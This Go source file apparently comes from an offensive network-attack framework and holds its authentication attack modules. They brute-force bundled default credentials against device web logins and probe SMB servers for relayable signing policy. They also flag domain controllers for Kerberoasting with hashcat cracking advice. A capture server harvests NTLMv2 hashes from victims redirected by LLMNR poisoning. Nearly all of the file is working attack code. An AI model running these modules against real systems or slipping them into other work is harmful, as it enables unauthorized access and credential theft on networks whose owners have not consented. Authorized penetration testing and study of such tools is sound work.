// Package auth implements the authentication-focused attack modules:
// default-credential checks, SMB signing policy probing and NTLM capture.
package auth

import (
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/netx/ntlm"
	"github.com/qyvora/toha3ee/internal/netx/smb"
	"github.com/qyvora/toha3ee/internal/safety"
	"github.com/qyvora/toha3ee/internal/store"
)

func init() {
	attacks.Register(&DefaultCreds{})
	attacks.Register(&SMBSigning{})
	attacks.Register(&NTLMRelay{})
	attacks.Register(&KerberoastSuggest{})
	attacks.Register(&PasswordSpray{})
	attacks.Register(&SSHBrowse{})
	attacks.Register(&SSHUserEnum{})
	attacks.Register(&ASREP{})
}

// defaultCreds is a list of well-known bundled credentials for consumer
// routers and IoT appliances.
var defaultCreds = []struct{ user, pass string }{
	{"admin", "admin"},
	{"admin", "password"},
	{"admin", "1234"},
	{"admin", ""},
	{"root", "root"},
	{"root", "toor"},
	{"root", "admin"},
	{"user", "user"},
	{"ubnt", "ubnt"},
	{"admin", "default"},
}

// DefaultCreds probes web-enabled hosts for bundled default credentials. It
// tries the well-known vendor credential pairs against the discovered web
// services and reports any that authenticate.
type DefaultCreds struct{}

// Meta implements attacks.Module.
func (*DefaultCreds) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "default.creds",
		Category:    "auth",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"host"},
		Description: "test bundled default credentials against device web logins (basic auth)",
		Limitations: "heuristic: only verifies HTTP basic auth; form-based device portals require per-device logic",
	}
}

// Preflight checks that at least one web-enabled host is known.
func (*DefaultCreds) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	rep.AddOK("protocol", "HTTP(S) probing is non-destructive")
	found := false
	for _, h := range ctx.Store.Hosts() {
		if webPort(h) > 0 {
			found = true
			break
		}
	}
	if !found {
		rep.AddFixable("targets", "no hosts with web ports; run service.synscan first")
	} else {
		rep.AddOK("targets", "web-enabled host(s) available")
	}
	return rep, nil
}

// Run probes each web-enabled host with the default credential list.
func (*DefaultCreds) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	timeout := ctx.Conf.GetDuration("default.creds", "timeout", 3*time.Second)
	client := &http.Client{Timeout: timeout, CheckRedirect: func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	}}

	targets := credTargets(ctx, "default.creds")
	if len(targets) == 0 {
		return fmt.Errorf("default.creds: no web-enabled hosts; run service.synscan first")
	}

	var found atomic.Int64
	for _, t := range targets {
		scheme := "http"
		if t.port == 443 || t.port == 8443 {
			scheme = "https"
		}
		base := fmt.Sprintf("%s://%s", scheme, net.JoinHostPort(t.host.IP.String(), strconv.Itoa(int(t.port))))
		for _, c := range defaultCreds {
			req, err := http.NewRequest("GET", base+"/", nil)
			if err != nil {
				continue
			}
			req.SetBasicAuth(c.user, c.pass)
			req.Header.Set("User-Agent", "toha3ee/1.0")
			resp, err := client.Do(req)
			if err != nil {
				break // host unreachable or closed the connection
			}
			body := make([]byte, 0)
			if resp.Body != nil {
				b := make([]byte, 256)
				n, _ := resp.Body.Read(b)
				body = b[:n]
				resp.Body.Close()
			}
			authOK := resp.StatusCode != http.StatusUnauthorized &&
				resp.StatusCode != http.StatusForbidden &&
				!looksLikeLoginPage(body)
			if authOK {
				found.Add(1)
				ctx.Store.AddCred(store.Cred{
					Service:  "http.basic",
					Username: c.user,
					Password: c.pass,
					Host:     t.host.IP.String(),
					VictimIP: t.host.IP.String(),
					Source:   "default.creds",
					Time:     time.Now(),
				})
				ctx.Emit(events.TopicCredFound, fmt.Sprintf("default.creds: %s accepted %s:%s", t.host.IP, c.user, c.pass), nil)
				ctx.Printf("[+] default.creds: %s %s:%s\n", t.host.IP, c.user, c.pass)
				break
			}
			if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
				// Basic auth is enforced; keep trying the list.
				continue
			}
			// Some other 2xx page; only the login-page heuristic guards this.
		}
	}
	ctx.SetState("default.creds", found.Load())
	ctx.Printf("[*] default.creds complete: %d valid default credential(s).\n", found.Load())
	return nil
}

// Verify reports the number of valid default credentials found.
func (*DefaultCreds) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	n, _ := ctx.GetState("default.creds")
	count, _ := n.(int64)
	imp := &attacks.Impact{Summary: fmt.Sprintf("%d default credential(s) accepted", count)}
	imp.Add("credentials", strconv.FormatInt(count, 10))
	for _, c := range ctx.Store.CredsBySource("default.creds") {
		imp.Add("cred", c.Host+" "+c.Username+":"+c.Password)
	}
	return imp, nil
}

// Cleanup is a no-op.
func (*DefaultCreds) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// SMBSigning probes discovered SMB servers for their message-signing policy
// and flags servers that do not require signing (a common relay prerequisite).
type SMBSigning struct{}

// Meta implements attacks.Module.
func (*SMBSigning) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "smb.signing",
		Category:    "auth",
		Risk:        attacks.RiskInfo,
		Targets:     []string{"host"},
		Passive:     true,
		Description: "probe SMB (445) servers for whether message signing is enabled or required",
		Limitations: "hosts must answer an SMB2 negotiate; SMB1-only or non-SMB listeners are skipped",
	}
}

// Preflight checks for hosts with port 445 open.
func (*SMBSigning) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	rep.AddOK("protocol", "single SMB2 negotiate per host")
	if !hasPort(ctx.Store.Hosts(), 445) {
		rep.AddFixable("targets", "no SMB (445) hosts; run service.synscan first")
	} else {
		rep.AddOK("targets", "SMB host(s) available")
	}
	return rep, nil
}

// Run probes each SMB host.
func (*SMBSigning) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	timeout := ctx.Conf.GetDuration("smb.signing", "timeout", 4*time.Second)
	port := ctx.Conf.GetInt("smb.signing", "port", 445)
	results := map[string]bool{}
	for _, h := range ctx.Store.Hosts() {
		if !containsPort(h.OpenPorts(), 445) {
			continue
		}
		addr := net.JoinHostPort(h.IP.String(), strconv.Itoa(port))
		res, err := smb.Probe(addr, timeout)
		if err != nil {
			ctx.Emit(events.TopicLog, fmt.Sprintf("smb.signing: %s probe failed: %v", h.IP, err), nil)
			continue
		}
		// A server without signing required is relay-able.
		results[h.IP.String()] = res.Required
		if res.Required {
			ctx.Emit(events.TopicLog, fmt.Sprintf("smb.signing: %s REQUIRES signing (relay blocked)", h.IP), nil)
		} else {
			ctx.Emit(events.TopicLog, fmt.Sprintf("smb.signing: %s signing NOT required (relay candidate)", h.IP), nil)
			ctx.Printf("[!] smb.signing: %s does not require signing\n", h.IP)
		}
	}
	ctx.SetState("smb.signing", results)
	ctx.Printf("[*] smb.signing complete: probed %d SMB host(s).\n", len(results))
	return nil
}

// Verify reports signing posture.
func (*SMBSigning) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("smb.signing")
	results, _ := v.(map[string]bool)
	if !ok {
		results = map[string]bool{}
	}
	relayable := 0
	for _, req := range results {
		if !req {
			relayable++
		}
	}
	imp := &attacks.Impact{Summary: fmt.Sprintf("%d SMB host(s) probed, %d relayable", len(results), relayable)}
	imp.Add("probed", strconv.Itoa(len(results)))
	imp.Add("relayable", strconv.Itoa(relayable))
	return imp, nil
}

// Cleanup is a no-op.
func (*SMBSigning) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// KerberoastSuggest identifies likely Active Directory domain controllers
// (Kerberos :88 + LDAP :389) in the host inventory and advises on a
// Kerberoasting next step. It is advisory: it never authenticates.
type KerberoastSuggest struct{}

// dcCandidate is a host that exposes a DC-like port combination.
type dcCandidate struct {
	ip    string
	ports []uint16
}

// Meta returns the module descriptor used for registry, help and REPL
// completion.
func (*KerberoastSuggest) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "smb.kerberoast",
		Category:    "auth",
		Risk:        attacks.RiskInfo,
		Targets:     []string{"host"},
		Passive:     true,
		Description: "spot likely domain controllers and report whether Kerberoasting (SPN hash extraction) is a viable next step",
		Limitations: "only infers DC presence from open ports (88/389/636/445); does not check for vulnerable SPNs or valid credentials",
	}
}

// Preflight checks the host inventory is populated.
func (*KerberoastSuggest) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if len(ctx.Store.Hosts()) == 0 {
		rep.AddFixable("hosts", "no hosts in the store; run net.scan + service.synscan first")
		return rep, nil
	}
	rep.AddOK("hosts", fmt.Sprintf("%d host(s) available", len(ctx.Store.Hosts())))
	return rep, nil
}

// Run scans the inventory for DC-like hosts.
func (*KerberoastSuggest) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	var dcs []dcCandidate
	for _, h := range ctx.Store.Hosts() {
		ports := h.OpenPorts()
		hasKerberos := containsPort(ports, 88)
		hasLDAP := containsPort(ports, 389) || containsPort(ports, 636)
		hasSMB := containsPort(ports, 445)
		if hasKerberos && (hasLDAP || hasSMB) {
			dcs = append(dcs, dcCandidate{ip: h.IP.String(), ports: ports})
		}
	}
	ctx.SetState("smb.kerberoast", dcs)
	if len(dcs) == 0 {
		ctx.Printf("[*] smb.kerberoast: no domain-controller-like host found; Kerberoasting unlikely to apply.\n")
		return nil
	}
	for _, d := range dcs {
		ctx.Printf("[!] smb.kerberoast: %s looks like a domain controller (ports %v). If you hold a domain account, request SPN service tickets and crack offline (hashcat mode 13100).\n", d.ip, d.ports)
	}
	return nil
}

// Verify reports the DC candidate count.
func (*KerberoastSuggest) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("smb.kerberoast")
	if !ok {
		return &attacks.Impact{Summary: "kerberoast assessment complete"}, nil
	}
	dcs := v.([]dcCandidate)
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("found %d domain-controller candidate(s); Kerberoasting viable with valid creds", len(dcs)),
	}
	imp.Add("dc_candidates", fmt.Sprintf("%d", len(dcs)))
	return imp, nil
}

// Cleanup is a no-op.
func (*KerberoastSuggest) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// NTLMRelay listens for NTLM authentication attempts and captures NTLMv2
// hash material into the store.
type NTLMRelay struct{}

// Meta implements attacks.Module.
func (*NTLMRelay) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "ntlm.relay",
		Category:    "auth",
		Risk:        attacks.RiskCritical,
		Targets:     []string{"host"},
		Description: "challenge NTLM clients and capture NTLMv2 hashes for offline cracking",
		Limitations: "captures hashes only; relaying to a live service requires the capture to happen on the service port",
	}
}

// Preflight checks the configured listen port is usable.
func (*NTLMRelay) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	port := ctx.Conf.GetInt("ntlm.relay", "port", 8445)
	probe, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		rep.AddBlocked("port", fmt.Sprintf("cannot bind :%d: %v", port, err))
	} else {
		probe.Close()
		rep.AddOK("port", fmt.Sprintf("bindable on :%d", port))
	}
	return rep, nil
}

// Run starts the NTLM capture server and blocks until stopped.
func (*NTLMRelay) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	port := ctx.Conf.GetInt("ntlm.relay", "port", 8445)
	domain := ctx.Conf.Get("ntlm.relay", "domain")
	if domain == "" {
		domain = "CORP"
	}
	srv := ntlm.NewServer(func(h ntlm.CapturedHash) {
		challenge := hex(h.Challenge)
		ntHash := hex(h.NTResponse)
		ctx.Store.AddCred(store.Cred{
			Service:  "ntlmv2",
			Username: h.Username,
			Password: ntHash,
			Extra:    "challenge=" + challenge,
			Host:     h.Domain,
			VictimIP: hostOf(h.Client),
			Source:   "ntlm.relay",
			Time:     time.Now(),
		})
		ctx.Emit(events.TopicCredFound,
			fmt.Sprintf("ntlm.relay: captured NTLMv2 for %s\\%s (client %s)", h.Domain, h.Username, h.Client), nil)
	}, domain)
	if _, err := srv.Start(fmt.Sprintf(":%d", port)); err != nil {
		return fmt.Errorf("ntlm.relay: %w", err)
	}
	ctx.SetState("ntlm.relay", srv)
	ctx.Safety.RegisterCleanup("ntlm.relay", "stop NTLM capture server", func() error {
		srv.Stop()
		return nil
	})
	ctx.Printf("[*] ntlm.relay listening on :%d (domain %s). Point victims here via llmnr.poison.\n", port, domain)

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("ntlm.relay", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports capture counters.
func (*NTLMRelay) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("ntlm.relay")
	if !ok {
		return nil, fmt.Errorf("ntlm.relay not running")
	}
	srv := v.(*ntlm.Server)
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("captured %d NTLM hash(es) across %d handshake(s)", srv.Captured.Load(), srv.Accepted.Load()),
	}
	imp.Add("captured", fmt.Sprintf("%d", srv.Captured.Load()))
	imp.Add("handshakes", fmt.Sprintf("%d", srv.Accepted.Load()))
	for _, c := range ctx.Store.CredsBySource("ntlm.relay") {
		imp.Add("hash", c.Username+" "+c.Password)
	}
	return imp, nil
}

// Cleanup stops the capture server.
func (*NTLMRelay) Cleanup(ctx *attacks.AttackCtx) error {
	if v, ok := ctx.GetState("ntlm.relay"); ok {
		v.(*ntlm.Server).Stop()
	}
	return nil
}

// credTarget is a host:port pair eligible for default-credential probing.
type credTarget struct {
	host *store.Host
	port uint16
}

// credTargets resolves the hosts to probe. When the "ports" knob of the given
// module namespace is set it takes precedence (used by tests and for unusual
// web ports); otherwise the standard web ports on each host are used.
func credTargets(ctx *attacks.AttackCtx, ns string) []credTarget {
	var out []credTarget
	if raw := ctx.Conf.Get(ns, "ports"); strings.TrimSpace(raw) != "" {
		for _, h := range ctx.Store.Hosts() {
			for _, s := range strings.Split(raw, ",") {
				n, err := strconv.Atoi(strings.TrimSpace(s))
				if err != nil || n < 1 || n > 65535 {
					continue
				}
				out = append(out, credTarget{host: h, port: uint16(n)})
			}
		}
		return out
	}
	for _, h := range ctx.Store.Hosts() {
		if p := webPort(h); p > 0 {
			out = append(out, credTarget{host: h, port: p})
		}
	}
	return out
}

func webPort(h *store.Host) uint16 {
	for _, p := range h.OpenPorts() {
		if p == 80 || p == 443 || p == 8080 || p == 8443 {
			return p
		}
	}
	return 0
}

func hasPort(hosts []*store.Host, want uint16) bool {
	for _, h := range hosts {
		if containsPort(h.OpenPorts(), want) {
			return true
		}
	}
	return false
}

func containsPort(ports []uint16, want uint16) bool {
	for _, p := range ports {
		if p == want {
			return true
		}
	}
	return false
}

func looksLikeLoginPage(body []byte) bool {
	low := strings.ToLower(string(body))
	for _, k := range []string{"<form", "password", "login", "input name=\"user", "input name='user"} {
		if strings.Contains(low, k) {
			return true
		}
	}
	return false
}

func hex(b []byte) string {
	const digits = "0123456789abcdef"
	out := make([]byte, len(b)*2)
	for i, v := range b {
		out[i*2] = digits[v>>4]
		out[i*2+1] = digits[v&0xf]
	}
	return string(out)
}

func hostOf(addr string) string {
	if h, _, err := net.SplitHostPort(addr); err == nil {
		return h
	}
	return addr
}

var (
	_ attacks.Module = (*DefaultCreds)(nil)
	_ attacks.Module = (*SMBSigning)(nil)
	_ attacks.Module = (*NTLMRelay)(nil)
)
